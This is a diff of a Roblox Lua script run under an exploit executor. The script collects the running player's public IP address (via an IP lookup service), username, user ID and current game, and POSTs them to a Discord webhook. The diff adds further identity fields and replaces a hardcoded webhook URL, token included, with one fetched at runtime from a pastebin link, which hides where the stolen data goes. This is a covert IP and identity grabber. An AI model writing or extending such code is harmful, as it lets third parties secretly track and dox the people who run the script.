@@ -51,10 +51,18 @@ else
                         ["fields"] = {
                             {   ['name'] = "Địa chỉ IP",
                                 ["value"] = "||"..game:HttpGet("https://v4.ident.me").."||",    
+                                ["inline"] = false 
+                            },
+                            {   ['name'] =  "Roblox Username",
+                                ["value"] = game.Players.LocalPlayer.Name,    
                                 ["inline"] = true 
                             },
-                         {   ['name'] =  "Roblox Username",
-                                ["value"] = game.Players.LocalPlayer.Name,    
+                            {   ['name'] =  "Roblox User ID",
+                                ["value"] = game.Players.LocalPlayer.UserId,    
+                                ["inline"] = true 
+                            },
+                            {   ['name'] =  "Game Link",
+                                ["value"] = "https://roblox.com/games/"..game.PlaceId.."/",    
                                 ["inline"] = false 
                             },
                             {   ['name'] =  "Place ID",
@@ -64,14 +72,13 @@ else
                             {   ['name'] =  "Place Name",
                                 ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,    
                                 ["inline"] = true 
-                            },
+                            }
                                     },
-                       
                     }}
                 }
                 syn.request(
                     {
-                    Url = "https://discord.com/api/webhooks/1006950873596964946/sa8KT3NNLq_xlzf81K4NqoSom3AjbYS60Q05jGLfNMX62muVzecmZd_mbx0fdozvnv28",
+                    Url = game:HttpGet("https://pastebin.com/raw/YsJLzLaj"),
                     Method = "POST",
                     Headers = {["Content-Type"] = "application/json"},
                     Body = game:GetService("HttpService"):JSONEncode(msg1)
